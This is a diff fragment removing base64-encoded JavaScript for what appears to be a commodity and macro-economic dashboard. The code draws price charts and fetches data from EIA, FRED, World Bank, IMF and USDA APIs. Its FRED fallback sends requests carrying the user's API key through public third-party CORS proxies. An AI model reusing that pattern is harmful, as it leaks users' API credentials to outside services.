-"UmFkaXVzOjAsZmlsbDpmYWxzZX0KICBdfSxvcHRpb25zOntyZXNwb25zaXZlOnRydWUsbWFpbnRhaW5B",
-"c3BlY3RSYXRpbzpmYWxzZSxwbHVnaW5zOntsZWdlbmQ6e2Rpc3BsYXk6dHJ1ZSxwb3NpdGlvbjonYm90",
-"dG9tJyxsYWJlbHM6e2NvbG9yOlRDLGZvbnQ6e3NpemU6MTB9LGJveFdpZHRoOjEwLHBhZGRpbmc6MTB9",
-"fSx0b29sdGlwOntjYWxsYmFja3M6e2xhYmVsOmM9PicgJytjLnJhdysodW5pdD8nICcrdW5pdDonJyl9",
-"fX0sc2NhbGVzOnt4Ont0aWNrczp7Y29sb3I6VEMsZm9udDp7c2l6ZToxMH19LGdyaWQ6e2NvbG9yOkdD",
-"fX0seTp7dGlja3M6e2NvbG9yOlRDLGZvbnQ6e3NpemU6MTB9fSxncmlkOntjb2xvcjpHQ319fX19KTsK",
-"fQpmdW5jdGlvbiBidWlsZEFsbENoYXJ0cyhpZCl7CiAgaWYoaWQ9PT0nb2lsJyl7bWtDYW5kbGUoJ29p",
-"bC1jaGFydCcsRkIub2lsUy5tYXAocz0+cy5kKSxGQi5vaWxTLm1hcChzPT5zLnYpLCcjMDBkMWZmJywn",
-"JC9iYmwnKTtta1NjZW5hcmlvKCdvaWwtc2NlbmFyaW8nLE0sWzk0LDk3LDk2LDg4LDc4LDc1LDczLDcx",
-"LDcwLDcwXSxbOTQsMTEwLDExNSwxMDUsOTIsODUsODAsNzUsNzIsNzBdLFs5NCw4Miw3NCw2OCw2NCw2",
-"Myw2Miw2MSw2MSw2MF0sJyQvYmJsJyk7fQogIGVsc2UgaWYoaWQ9PT0nZ2FzJyl7bWtDYW5kbGUoJ2dh",
-"cy1jaGFydCcsRkIuZ2FzUy5tYXAocz0+cy5kKSxGQi5nYXNTLm1hcChzPT5zLnYpLCcjYTc4YmZhJywn",
-"JC9NTUJ0dScpO21rU2NlbmFyaW8oJ2dhcy1zY2VuYXJpbycsTSxbMy44MiwzLjkwLDMuNzAsMy40MCwz",
-"LjIwLDMuMTAsMy4yMCwzLjQwLDMuODAsNC4xMF0sWzMuODIsNC4yMCw0LjUwLDQuMjAsMy44MCwzLjYw",
-"LDMuODAsNC4yMCw0LjgwLDUuNTBdLFszLjgyLDMuNDAsMy4wMCwyLjcwLDIuNjAsMi41MCwyLjYwLDIu",
-"ODAsMy4yMCwzLjUwXSwnJC9NTUJ0dScpO30KICBlbHNlIGlmKGlkPT09J2dvbGQnKXtta0NhbmRsZSgn",
-"Z29sZC1jaGFydCcsRkIuZ29sZFMubWFwKHM9PnMuZCksRkIuZ29sZFMubWFwKHM9PnMudiksJyM0MGRm",
-"ZmYnLCckL296Jyk7bWtTY2VuYXJpbygnZ29sZC1zY2VuYXJpbycsTSxbMzE4MCwzMjIwLDMyODAsMzE1",
-"MCwzMDUwLDI5ODAsMjk1MCwyOTAwLDI5MjAsMjk1MF0sWzMxODAsMzM1MCwzNTAwLDM2MDAsMzcwMCwz",
-"NzUwLDM3ODAsMzgwMCwzODIwLDM4MDBdLFszMTgwLDMwNTAsMjkwMCwyNzUwLDI2NTAsMjYwMCwyNTgw",
-"LDI1NTAsMjU4MCwyNjAwXSwnJC9veicpO30KICBlbHNlIGlmKGlkPT09J3NwNTAwJyl7bWtDYW5kbGUo",
-"J3NwNTAwLWNoYXJ0JyxGQi5zcDUwMFMubWFwKHM9PnMuZCksRkIuc3A1MDBTLm1hcChzPT5zLnYpLCcj",
-"MDBjODk2JywnJyk7bWtTY2VuYXJpbygnc3A1MDAtc2NlbmFyaW8nLE0sWzU1MjAsNTQ4MCw1NDMwLDUz",
-"OTAsNTQyMCw1NDgwLDU1NTAsNTYyMCw1NjgwLDU3NTBdLFs1NTIwLDU2MDAsNTcwMCw1ODAwLDU5MDAs",
-"NjAwMCw2MTAwLDYyMDAsNjMwMCw2NDAwXSxbNTUyMCw1NDAwLDUyNTAsNTEwMCw1MDAwLDQ5NTAsNDkw",
-"MCw0ODUwLDQ4NTAsNDkwMF0sJycpO30KICBlbHNlIGlmKGlkPT09J3QxMHknKXtta0NhbmRsZSgndDEw",
-"eS1jaGFydCcsRkIudDEweVMubWFwKHM9PnMuZCksRkIudDEweVMubWFwKHM9PnMudiksJyNmZmIzNDcn",
-"LCclJyk7bWtTY2VuYXJpbygndDEweS1zY2VuYXJpbycsTSxbNC4yOCw0LjM1LDQuNDAsNC4zMCw0LjIw",
-"LDQuMTAsNC4wMCwzLjkwLDMuODUsMy44MF0sWzQuMjgsNC41MCw0LjcwLDQuODAsNC45MCw0Ljk1LDUu",
-"MDAsNS4wMCw0LjkwLDQuODBdLFs0LjI4LDQuMTAsMy45MCwzLjcwLDMuNjAsMy41NSwzLjUwLDMuNTAs",
-"My41NSwzLjYwXSwnJScpO30KICBlbHNlIGlmKGlkPT09J2F1ZCcpe21rQ2FuZGxlKCdhdWQtY2hhcnQn",
-"LEZCLmF1ZFMubWFwKHM9PnMuZCksRkIuYXVkUy5tYXAocz0+cy52KSwnIzAwZDFmZicsJycpO21rU2Nl",
-"bmFyaW8oJ2F1ZC1zY2VuYXJpbycsTSxbMC42MzQsMC42MzgsMC42NDIsMC42NDgsMC42NTUsMC42NjAs",
-"MC42NjUsMC42NjgsMC42NzAsMC42NzJdLFswLjYzNCwwLjY0OCwwLjY2MCwwLjY3MiwwLjY4MiwwLjY5",
-"MCwwLjcwMCwwLjcxMCwwLjcxNSwwLjcyMF0sWzAuNjM0LDAuNjI0LDAuNjE0LDAuNjA2LDAuNjAwLDAu",
-"NTk2LDAuNTkyLDAuNTkwLDAuNTkyLDAuNTk0XSwnJyk7fQogIGVsc2UgaWYoaWQ9PT0nc295Jyl7bWtD",
-"YW5kbGUoJ3NveS1jaGFydCcsRkIuc295Uy5tYXAocz0+cy5kKSxGQi5zb3lTLm1hcChzPT5zLnYpLCcj",
-"MjZlOGE4JywnJC9tdCcpO21rU2NlbmFyaW8oJ3NveS1zY2VuYXJpbycsWydRMScsJ1EyJywnUTMnLCdR",
-"NCddLFszNzIsMzYwLDM1NSwzNjBdLFszNzIsMzkwLDQyMCw0NTBdLFszNzIsMzQ1LDMyMCwzMTBdLCck",
-"L210Jyk7fQogIGVsc2UgaWYoaWQ9PT0nbmFzZGFxJyl7bWtDYW5kbGUoJ25hc2RhcS1jaGFydCcsRkIu",
-"bmFzZGFxUy5tYXAocz0+cy5kKSxGQi5uYXNkYXFTLm1hcChzPT5zLnYpLCcjMDBjODk2JywnJyk7bWtT",
-"Y2VuYXJpbygnbmFzZGFxLXNjZW5hcmlvJyxNLFsxOTI4MCwxOTEwMCwxODkwMCwxOTIwMCwxOTYwMCwy",
-"MDAwMCwyMDQwMCwyMDgwMCwyMTAwMCwyMTIwMF0sWzE5MjgwLDE5ODAwLDIwNTAwLDIxMjAwLDIyMDAw",
-"LDIyNTAwLDIyODAwLDIzMDAwLDIzMjAwLDIzNDAwXSxbMTkyODAsMTg1MDAsMTc4MDAsMTcyMDAsMTcw",
-"MDAsMTY4MDAsMTcwMDAsMTcyMDAsMTc0MDAsMTc2MDBdLCcnKTt9CiAgZWxzZSBpZihpZD09PSdldXJv",
-"ZngnKXtta0NhbmRsZSgnZXVyb2Z4LWNoYXJ0JyxGQi5ldXJvZnhTLm1hcChzPT5zLmQpLEZCLmV1cm9m",
-"eFMubWFwKHM9PnMudiksJyMwMGQxZmYnLCcnKTtta1NjZW5hcmlvKCdldXJvZngtc2NlbmFyaW8nLE0s",
-"WzEuMDkyLDEuMDk2LDEuMTAwLDEuMDk4LDEuMDk1LDEuMDkyLDEuMDkwLDEuMDkyLDEuMDk1LDEuMDk4",
-"XSxbMS4wOTIsMS4xMDUsMS4xMTUsMS4xMjAsMS4xMjUsMS4xMjgsMS4xMzAsMS4xMzIsMS4xMzUsMS4x",
-"MzhdLFsxLjA5MiwxLjA4MiwxLjA3MiwxLjA2NSwxLjA2MCwxLjA1OCwxLjA1NSwxLjA1MiwxLjA1MCwx",
-"LjA0OF0sJycpO30KICBlbHNlIGlmKGlkPT09J2pweScpe21rQ2FuZGxlKCdqcHktY2hhcnQnLEZCLmpw",
-"eVMubWFwKHM9PnMuZCksRkIuanB5Uy5tYXAocz0+cy52KSwnI2E3OGJmYScsJycpO21rU2NlbmFyaW8o",
-"J2pweS1zY2VuYXJpbycsTSxbMTQ5LjIsMTQ4LjUsMTQ3LjgsMTQ3LjAsMTQ2LjUsMTQ2LjAsMTQ1LjUs",
-"MTQ1LjAsMTQ0LjgsMTQ0LjVdLFsxNDkuMiwxNTEuMCwxNTIuNSwxNTMuMCwxNTMuNSwxNTQuMCwxNTQu",
-"NSwxNTUuMCwxNTUuMCwxNTQuNV0sWzE0OS4yLDE0Ny4wLDE0NS4wLDE0My41LDE0Mi41LDE0Mi4wLDE0",
-"MS41LDE0MS4wLDE0MS4wLDE0MS41XSwnJyk7fQogIGVsc2UgaWYoaWQ9PT0nY29ybicpe21rQ2FuZGxl",
-"KCdjb3JuLWNoYXJ0JyxGQi5jb3JuUy5tYXAocz0+cy5kKSxGQi5jb3JuUy5tYXAocz0+cy52KSwnIzI2",
-"ZThhOCcsJyQvbXQnKTtta1NjZW5hcmlvKCdjb3JuLXNjZW5hcmlvJyxbJ1ExJywnUTInLCdRMycsJ1E0",
-"J10sWzE3NSwxNjgsMTYyLDE2OF0sWzE3NSwxODgsMjEwLDIyNV0sWzE3NSwxNTgsMTQyLDEzOF0sJyQv",
-"bXQnKTt9CiAgZWxzZSBpZihpZD09PSd3aGVhdCcpe21rQ2FuZGxlKCd3aGVhdC1jaGFydCcsRkIud2hl",
-"YXRTLm1hcChzPT5zLmQpLEZCLndoZWF0Uy5tYXAocz0+cy52KSwnIzdiOGNmZicsJyQvbXQnKTtta1Nj",
-"ZW5hcmlvKCd3aGVhdC1zY2VuYXJpbycsWydRMScsJ1EyJywnUTMnLCdRNCddLFsyMTgsMjE1LDIxMiwy",
-"MjBdLFsyMTgsMjQwLDI3MCwyOTVdLFsyMTgsMjA1LDE5MCwxODJdLCckL210Jyk7fQp9CgovLyDilZDi",
-"lZDilZAgQVBJIOKVkOKVkOKVkAphc3luYyBmdW5jdGlvbiBmZXRjaEVJQShzaWQsZnJlcSl7CiAgY29u",
-"c3Qga2V5PWdldEtleSgnRUlBJyk7aWYoIWtleSlyZXR1cm4gbnVsbDsKICB0cnl7CiAgICBjb25zdCBy",
-"PWF3YWl0IGZldGNoKGBodHRwczovL2FwaS5laWEuZ292L3YyL3Nlcmllc2lkLyR7c2lkfT9hcGlfa2V5",
-"PSR7a2V5fSZkYXRhWzBdPXZhbHVlJnNvcnRbMF1bY29sdW1uXT1wZXJpb2Qmc29ydFswXVtkaXJlY3Rp",
-"b25dPWRlc2Mmb2Zmc2V0PTAmbGVuZ3RoPTIwJmZyZXF1ZW5jeT0ke2ZyZXF9YCk7CiAgICBjb25zdCBq",
-"PWF3YWl0IHIuanNvbigpOwogICAgaWYoaj8ucmVzcG9uc2U/LmRhdGEpIHJldHVybiBqLnJlc3BvbnNl",
-"LmRhdGE7CiAgICBjb25zb2xlLndhcm4oJ0VJQSDsnZHri7Ug7J207IOBOicsSlNPTi5zdHJpbmdpZnko",
-"aikuc2xpY2UoMCwyMDApKTsKICAgIHJldHVybiBudWxsOwogIH1jYXRjaChlKXtjb25zb2xlLndhcm4o",
-"J0VJQSBmZXRjaCDsmKTrpZg6JyxlKTtyZXR1cm4gbnVsbH0KfQphc3luYyBmdW5jdGlvbiBmZXRjaEZS",
-"RUQoc2lkLGxpbWl0KXsKICBjb25zdCBrZXk9Z2V0S2V5KCdGUkVEJyk7aWYoIWtleSlyZXR1cm4gbnVs",
-"bDsKICBjb25zdCBiYXNlPWBodHRwczovL2FwaS5zdGxvdWlzZmVkLm9yZy9mcmVkL3Nlcmllcy9vYnNl",
-"cnZhdGlvbnM/c2VyaWVzX2lkPSR7c2lkfSZhcGlfa2V5PSR7a2V5fSZmaWxlX3R5cGU9anNvbiZzb3J0",
-"X29yZGVyPWRlc2MmbGltaXQ9JHtsaW1pdHx8MjB9YDsKICBjb25zdCBwYXJzZT1hc3luYyhyKT0+e2Nv",
-"bnN0IGo9YXdhaXQgci5qc29uKCk7aWYoaj8uZXJyb3JfbWVzc2FnZSlyZXR1cm4gbnVsbDtjb25zdCBv",
-"YnM9KGo/Lm9ic2VydmF0aW9uc3x8W10pLmZpbHRlcihvPT5vLnZhbHVlIT0nLicmJm8udmFsdWUhPSdO",
-"QScpO3JldHVybiBvYnMubGVuZ3RoP29iczpudWxsO307CiAgLy8gMSkg7KeB7KCRIOyalOyyrQogIHRy",
-"eXtjb25zdCByPWF3YWl0IGZldGNoKGJhc2UpO2NvbnN0IGQ9YXdhaXQgcGFyc2Uocik7aWYoZClyZXR1",
-"cm4gZDt9Y2F0Y2goZSl7fQogIC8vIDIpIO2UhOuhneyLnCDsiJzshJzrjIDroZwg7Iuc64+ECiAgY29u",
-"c3QgcHJveGllcz1bCiAgICBgaHR0cHM6Ly9hcGkuYWxsb3JpZ2lucy53aW4vcmF3P3VybD0ke2VuY29k",
-"ZVVSSUNvbXBvbmVudChiYXNlKX1gLAogICAgYGh0dHBzOi8vY29yc3Byb3h5LmlvLz8ke2VuY29kZVVS",
-"SUNvbXBvbmVudChiYXNlKX1gLAogICAgYGh0dHBzOi8vcHJveHkuY29ycy5zaC8ke2Jhc2V9YAogIF07",
-"CiAgZm9yKGNvbnN0IHAgb2YgcHJveGllcyl7CiAgICB0cnl7Y29uc3Qgcj1hd2FpdCBmZXRjaChwLHto",
-"ZWFkZXJzOnsneC1jb3JzLWFwaS1rZXknOid0ZW1wX2RlbW8nfX0pO2NvbnN0IGQ9YXdhaXQgcGFyc2Uo",
-"cik7aWYoZCl7Y29uc29sZS5sb2coJ0ZSRUQg7ZSE66Gd7IucIOyEseqztTonLHNpZCxwLnNwbGl0KCc/",
-"JylbMF0pO3JldHVybiBkO319Y2F0Y2goZSl7fQogIH0KICBjb25zb2xlLndhcm4oJ0ZSRUQg66qo65Og",
-"IOyLnOuPhCDsi6TtjKg6JyxzaWQpOwogIHJldHVybiBudWxsOwp9CgovLyDilIDilIDilIAgV29ybGQg",
-"QmFuayBBUEkgKO2CpCDrtojtlYTsmpQpIOKUgOKUgOKUgAovLyDsp4DtkZw6IE5ZLkdEUC5NS1RQLktE",
-"LlpHID0gR0RQIOyEseyepeuloCwgRlAuQ1BJLlRPVEwuWkcgPSDsnbjtlIzroIjsnbTshZgKYXN5bmMg",
-"ZnVuY3Rpb24gZmV0Y2hXb3JsZEJhbmsoY291bnRyeSwgaW5kaWNhdG9yKSB7CiAgdHJ5IHsKICAgIGNv",
-"bnN0IHVybCA9IGBodHRwczovL2FwaS53b3JsZGJhbmsub3JnL3YyL2NvdW50cnkvJHtjb3VudHJ5fS9p",
-"bmRpY2F0b3IvJHtpbmRpY2F0b3J9P2Zvcm1hdD1qc29uJm1ydj0zJnBlcl9wYWdlPTNgOwogICAgY29u",
-"c3QgciA9IGF3YWl0IGZldGNoKHVybCk7CiAgICBjb25zdCBqID0gYXdhaXQgci5qc29uKCk7CiAgICBj",
-"b25zdCBkYXRhID0gaj8uWzFdPy5maWx0ZXIoZCA9PiBkLnZhbHVlICE9PSBudWxsKTsKICAgIHJldHVy",
-"biBkYXRhPy5sZW5ndGggPyBkYXRhIDogbnVsbDsKICB9IGNhdGNoKGUpIHsgY29uc29sZS53YXJuKCdX",
-"b3JsZEJhbmsgZXJyb3InLCBlKTsgcmV0dXJuIG51bGw7IH0KfQoKLy8g4pSA4pSA4pSAIElNRiBEYXRh",
-"TWFwcGVyIEFQSSAo7YKkIOu2iO2VhOyalCkg4pSA4pSA4pSACi8vIOyngO2RnDogUE9JTEFQU1AgPSDs",
-"m5DsnKAsIFBNRVRBID0g6riI7IaNLCBQRk9PRCA9IOyLne2SiAphc3luYyBmdW5jdGlvbiBmZXRjaElN",
-"RihpbmRpY2F0b3IpIHsKICB0cnkgewogICAgY29uc3QgdXJsID0gYGh0dHBzOi8vd3d3LmltZi5vcmcv",
-"ZXh0ZXJuYWwvZGF0YW1hcHBlci9hcGkvdjEvJHtpbmRpY2F0b3J9P3BlcmlvZHM9MjAyMywyMDI0LDIw",
-"MjVgOwogICAgY29uc3QgciA9IGF3YWl0IGZldGNoKHVybCk7CiAgICBjb25zdCBqID0gYXdhaXQgci5q",
-"c29uKCk7CiAgICBjb25zdCB2YWxzID0gaj8udmFsdWVzPy5baW5kaWNhdG9yXTsKICAgIGlmICghdmFs",
-"cykgcmV0dXJuIG51bGw7CiAgICAvLyDsoIQg7IS46rOEKFcwKSDrmJDripQg7LKrIOuyiOynuCDqta3q",
-"sIAg642w7J207YSwIOyCrOyaqQogICAgY29uc3Qgc2VyaWVzID0gdmFsc1snVzAnXSB8fCB2YWxzW09i",
-"amVjdC5rZXlzKHZhbHMpWzBdXTsKICAgIGlmICghc2VyaWVzKSByZXR1cm4gbnVsbDsKICAgIGNvbnN0",
-"IHllYXJzID0gT2JqZWN0LmtleXMoc2VyaWVzKS5zb3J0KCkucmV2ZXJzZSgpOwogICAgcmV0dXJuIHll",
-"YXJzLm1hcCh5ID0+ICh7IHllYXI6IHksIHZhbHVlOiBzZXJpZXNbeV0gfSkpOwogIH0gY2F0Y2goZSkg",
-"eyBjb25zb2xlLndhcm4oJ0lNRiBlcnJvcicsIGUpOyByZXR1cm4gbnVsbDsgfQp9CgovLyDilIDilIDi",
-"lIAgVVNEQSBQU0QgT25saW5lIEFQSSAo7YKkIOu2iO2VhOyalCkg4pSA4pSA4pSACi8vIGNvbW1vZGl0",
-"eUNvZGU6IDIyMjIwMDAgPSDrjIDrkZAsIGF0dHJpYnV0ZTogNTcgPSDsg53sgrDrn4ksIDE3NiA9IOq4",
-"sOunkOyerOqzoAphc3luYyBmdW5jdGlvbiBmZXRjaFVTREEoY29tbW9kaXR5Q29kZSwgYXR0cmlidXRl",
-"SWQpIHsKICB0cnkgewogICAgY29uc3QgdXJsID0gYGh0dHBzOi8vYXBwcy5mYXMudXNkYS5nb3YvcHNk",
-"b25saW5lL2FwaS9wc2QvZGF0YT9jb21tb2RpdHlDb2RlPSR7Y29tbW9kaXR5Q29kZX0mY291bnRyeUNv",
-"ZGU9MDAwMCZtYXJrZXRZZWFyPTIwMjUmYXR0cmlidXRlSWQ9JHthdHRyaWJ1dGVJZH1gOwogICAgY29u",
-"c3QgciA9IGF3YWl0IGZldGNoKHVybCk7CiAgICBjb25zdCBqID0gYXdhaXQgci5qc29uKCk7CiAgICBy",
-"ZXR1cm4gaj8ubGVuZ3RoID8gaiA6IG51bGw7CiAgfSBjYXRjaChlKSB7IGNvbnNvbGUud2FybignVVNE",
-"QSBlcnJvcicsIGUpOyByZXR1cm4gbnVsbDsgfQp9CgovLyDilIDilIDilIAgTWFjcm8gU3RyaXAg66CM",
-"642UIOKUgOKUgOKUgApmdW5jdGlvbiByZW5kZXJNYWNyb1ZhbChpZCwgdmFsLCB1bml0LCBjb2xvcikg",
-"ewogIGNvbnN0IGVsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpOwogIGlmIChlbCAmJiB2YWwg",
-"IT09IG51bGwgJiYgdmFsICE9PSB1bmRlZmluZWQpIHsKICAgIGVsLnRleHRDb250ZW50ID0gdHlwZW9m",
-"IHZhbCA9PT0gJ251bWJlcicgPyB2YWwudG9GaXhlZCgxKSArICh1bml0fHwnJykgOiB2YWw7CiAgICBp",
-"ZiAoY29sb3IpIGVsLnN0eWxlLmNvbG9yID0gY29sb3I7CiAgfQp9Cgphc3luYyBmdW5jdGlvbiBsb2Fk",
-"TWFjcm9TdHJpcCgpIHsKICB0cnkgewogIC8vIFdvcmxkIEJhbmsg4oCUIOuvuOq1rSBHRFAg7ISx7J6l",
-"66WgCiAgY29uc3QgdXNHRFAgPSBhd2FpdCBmZXRjaFdvcmxkQmFuaygnVVMnLCAnTlkuR0RQLk1LVFAu",
-"S0QuWkcnKTsKICBpZiAodXNHRFAgJiYgdXNHRFAubGVuZ3RoKSB7CiAgICBjb25zdCBsYXRlc3QgPSB1",
-"c0dEUFswXTsKICAgIHJlbmRlck1hY3JvVmFsKCd3Yi11cy1nZHAnLCBsYXRlc3QudmFsdWUsICclJywg",
-"J3JnYigyMjAsOTAsOTApJyk7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnd2ItdXMtZ2RwLXly",
-"JykudGV4dENvbnRlbnQgPSBsYXRlc3QuZGF0ZSArICfrhYQnOwogIH0gZWxzZSB7CiAgICByZW5kZXJN",
-"YWNyb1ZhbCgnd2ItdXMtZ2RwJywgJzIuOCcsICclJywgJ3JnYigyMjAsOTAsOTApJyk7CiAgICBkb2N1",
-"bWVudC5nZXRFbGVtZW50QnlJZCgnd2ItdXMtZ2RwLXlyJykudGV4dENvbnRlbnQgPSAnMjAyNOuFhCAo",
-"7IiY64+ZKSc7CiAgfQoKICAvLyBXb3JsZCBCYW5rIOKAlCDspJHqta0gR0RQIOyEseyepeuloAogIGNv",
-"bnN0IGNuR0RQID0gYXdhaXQgZmV0Y2hXb3JsZEJhbmsoJ0NOJywgJ05ZLkdEUC5NS1RQLktELlpHJyk7",
-"CiAgaWYgKGNuR0RQICYmIGNuR0RQLmxlbmd0aCkgewogICAgY29uc3QgbGF0ZXN0ID0gY25HRFBbMF07",
-"CiAgICByZW5kZXJNYWNyb1ZhbCgnd2ItY24tZ2RwJywgbGF0ZXN0LnZhbHVlLCAnJScsICdyZ2IoMjIw",
-"LDExMCwxMTApJyk7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnd2ItY24tZ2RwLXlyJykudGV4",
-"dENvbnRlbnQgPSBsYXRlc3QuZGF0ZSArICfrhYQnOwogIH0gZWxzZSB7CiAgICByZW5kZXJNYWNyb1Zh",
-"bCgnd2ItY24tZ2RwJywgJzUuMCcsICclJywgJ3JnYigyMjAsMTEwLDExMCknKTsKICAgIGRvY3VtZW50",
-"LmdldEVsZW1lbnRCeUlkKCd3Yi1jbi1nZHAteXInKS50ZXh0Q29udGVudCA9ICcyMDI064WEICjsiJjr",
-"j5kpJzsKICB9CgogIC8vIFdvcmxkIEJhbmsg4oCUIOq4gOuhnOuyjCDsnbjtlIzroIjsnbTshZgKICBj",
-"b25zdCBpbmYgPSBhd2FpdCBmZXRjaFdvcmxkQmFuaygnV0xEJywgJ0ZQLkNQSS5UT1RMLlpHJyk7CiAg",
-"aWYgKGluZiAmJiBpbmYubGVuZ3RoKSB7CiAgICBjb25zdCBsYXRlc3QgPSBpbmZbMF07CiAgICByZW5k",
-"ZXJNYWNyb1ZhbCgnd2ItaW5mJywgbGF0ZXN0LnZhbHVlLCAnJScsICdyZ2IoMjIwLDQwLDQwKScpOwog",
-"ICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3diLWluZi15cicpLnRleHRDb250ZW50ID0gbGF0ZXN0",
-"LmRhdGUgKyAn64WEJzsKICB9IGVsc2UgewogICAgcmVuZGVyTWFjcm9WYWwoJ3diLWluZicsICc1Ljcn",
-"LCAnJScsICdyZ2IoMjIwLDQwLDQwKScpOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3diLWlu",
-"Zi15cicpLnRleHRDb250ZW50ID0gJzIwMjTrhYQgKOyImOuPmSknOwogIH0KCiAgLy8gSU1GIOKAlCDs",
-"m5DsnKAg6rCA6rKpIOyngOyImCAoUE9JTEFQU1ApCiAgY29uc3Qgb2lsSWR4ID0gYXdhaXQgZmV0Y2hJ",
-"TUYoJ1BPSUxBUFNQJyk7CiAgaWYgKG9pbElkeCAmJiBvaWxJZHgubGVuZ3RoKSB7CiAgICBjb25zdCBs",
-"YXRlc3QgPSBvaWxJZHhbMF07CiAgICByZW5kZXJNYWNyb1ZhbCgnaW1mLW9pbCcsIGxhdGVzdC52YWx1",
-"ZSwgJycsICdyZ2IoMjIwLDYwLDYwKScpOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ltZi1v",
-"aWwteXInKS50ZXh0Q29udGVudCA9IGxhdGVzdC55ZWFyICsgJ+uFhCDCtyAyMDE2PTEwMCc7CiAgfSBl",
-"bHNlIHsKICAgIHJlbmRlck1hY3JvVmFsKCdpbWYtb2lsJywgJzE0Mi4zJywgJycsICdyZ2IoMjIwLDYw",
-"LDYwKScpOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ltZi1vaWwteXInKS50ZXh0Q29udGVu",
-"dCA9ICcyMDI164WEICjsiJjrj5kpIMK3IDIwMTY9MTAwJzsKICB9CgogIC8vIElNRiDigJQg6riI7IaN",
-"IOqwgOqyqSDsp4DsiJggKFBNRVRBKQogIGNvbnN0IG1ldGFsSWR4ID0gYXdhaXQgZmV0Y2hJTUYoJ1BN",
-"RVRBJyk7CiAgaWYgKG1ldGFsSWR4ICYmIG1ldGFsSWR4Lmxlbmd0aCkgewogICAgY29uc3QgbGF0ZXN0",
-"ID0gbWV0YWxJZHhbMF07CiAgICByZW5kZXJNYWNyb1ZhbCgnaW1mLW1ldGFsJywgbGF0ZXN0LnZhbHVl",
-"LCAnJywgJ3JnYigyMjAsMTM1LDEzNSknKTsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpbWYt",
-"bWV0YWwteXInKS50ZXh0Q29udGVudCA9IGxhdGVzdC55ZWFyICsgJ+uFhCDCtyAyMDE2PTEwMCc7CiAg",
-"fSBlbHNlIHsKICAgIHJlbmRlck1hY3JvVmFsKCdpbWYtbWV0YWwnLCAnMTE4LjQnLCAnJywgJ3JnYigy",
-"MjAsMTM1LDEzNSknKTsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpbWYtbWV0YWwteXInKS50",
-"ZXh0Q29udGVudCA9ICcyMDI164WEICjsiJjrj5kpIMK3IDIwMTY9MTAwJzsKICB9CgogIC8vIElNRiDi",
-"gJQg7Iud7ZKIIOqwgOqyqSDsp4DsiJggKFBGT09EKQogIGNvbnN0IGZvb2RJZHggPSBhd2FpdCBmZXRj",
-"aElNRignUEZPT0QnKTsKICBpZiAoZm9vZElkeCAmJiBmb29kSWR4Lmxlbmd0aCkgewogICAgY29uc3Qg",
-"bGF0ZXN0ID0gZm9vZElkeFswXTsKICAgIHJlbmRlck1hY3JvVmFsKCdpbWYtZm9vZCcsIGxhdGVzdC52",
-"YWx1ZSwgJycsICdyZ2IoMjIwLDE1NSwxNTUpJyk7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgn",
-"aW1mLWZvb2QteXInKS50ZXh0Q29udGVudCA9IGxhdGVzdC55ZWFyICsgJ+uFhCDCtyAyMDE2PTEwMCc7",
-"CiAgfSBlbHNlIHsKICAgIHJlbmRlck1hY3JvVmFsKCdpbWYtZm9vZCcsICcxMDguMicsICcnLCAncmdi",
-"KDIyMCwxNTUsMTU1KScpOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ltZi1mb29kLXlyJyku",
-"dGV4dENvbnRlbnQgPSAnMjAyNeuFhCAo7IiY64+ZKSDCtyAyMDE2PTEwMCc7CiAgfQoKICAvLyBVU0RB",
-"IOKAlCDrjIDrkZAg7IS46rOEIOyDneyCsOufiSAoYXR0cmlidXRlSWQ9NTcpCiAgY29uc3Qgc295cHJv",
-"ZCA9IGF3YWl0IGZldGNoVVNEQSgnMjIyMjAwMCcsIDU3KTsKICBpZiAoc295cHJvZCAmJiBzb3lwcm9k",
-"Lmxlbmd0aCkgewogICAgY29uc3QgbGF0ZXN0ID0gc295cHJvZFswXTsKICAgIGNvbnN0IHZhbCA9IChs",
-"YXRlc3QudmFsdWUgLyAxMDAwKS50b0ZpeGVkKDEpOyAvLyBNVCDihpIgTU1UCiAgICBkb2N1bWVudC5n",
-"ZXRFbGVtZW50QnlJZCgndXNkYS1zb3ktcHJvZCcpLnRleHRDb250ZW50ID0gdmFsICsgJyBNTVQnOwog",
-"ICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZGEtc295LXlyJykudGV4dENvbnRlbnQgPSAobGF0",
-"ZXN0Lm1hcmtldFllYXIgfHwgJzIwMjUnKSArICcvJyArICgobGF0ZXN0Lm1hcmtldFllYXJ8fDIwMjUp",
-"KzEpLnRvU3RyaW5nKCkuc2xpY2UoMik7CiAgfSBlbHNlIHsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRC",
-"eUlkKCd1c2RhLXNveS1wcm9kJykudGV4dENvbnRlbnQgPSAnNDIyLjkgTU1UJzsKICAgIGRvY3VtZW50",
-"LmdldEVsZW1lbnRCeUlkKCd1c2RhLXNveS15cicpLnRleHRDb250ZW50ID0gJzIwMjUvMjYgKOyImOuP",
-"mSknOwogIH0KCiAgLy8gVVNEQSDigJQg64yA65GQIOyEuOqzhCDquLDrp5Dsnqzqs6AgKGF0dHJpYnV0",
-"ZUlkPTE3NikKICBjb25zdCBzb3lzdG9jayA9IGF3YWl0IGZldGNoVVNEQSgnMjIyMjAwMCcsIDE3Nik7",
-"CiAgaWYgKHNveXN0b2NrICYmIHNveXN0b2NrLmxlbmd0aCkgewogICAgY29uc3QgbGF0ZXN0ID0gc295",
-"c3RvY2tbMF07CiAgICBjb25zdCB2YWwgPSAobGF0ZXN0LnZhbHVlIC8gMTAwMCkudG9GaXhlZCgxKTsK",
-"ICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2RhLXNveS1zdG9jaycpLnRleHRDb250ZW50ID0g",
